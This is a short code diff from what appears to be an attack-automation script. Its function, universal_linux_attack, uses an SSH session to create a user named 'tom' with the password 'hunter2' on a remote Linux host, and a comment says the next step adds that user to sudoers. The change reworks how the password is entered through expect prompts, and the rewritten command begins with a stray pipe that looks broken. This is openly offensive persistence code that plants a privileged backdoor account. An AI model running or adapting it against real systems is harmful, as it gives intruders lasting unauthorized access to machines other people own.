@@ -75,15 +75,20 @@ def universal_linux_attack(host):
     username = "tom"
     password = "hunter2"
     user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
-    user_passwd_cmd = "echo -e {1}\n{1} | passwd {0}".format(username, password)
     print("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip))
     
     ssh.sendline(user_add_cmd)
     ssh.prompt()
     print(ssh.before.decode('utf8'))
 
+    user_passwd_cmd = "| passwd {0}".format(username)
     ssh.sendline(user_passwd_cmd)
+    ssh.expect("password: ")
+    ssh.sendline(password)
+    ssh.expect("password: ")
+    ssh.sendline(password)
     ssh.prompt()
+    
     print(ssh.before.decode('utf8'))
     
     # add user to sudoers
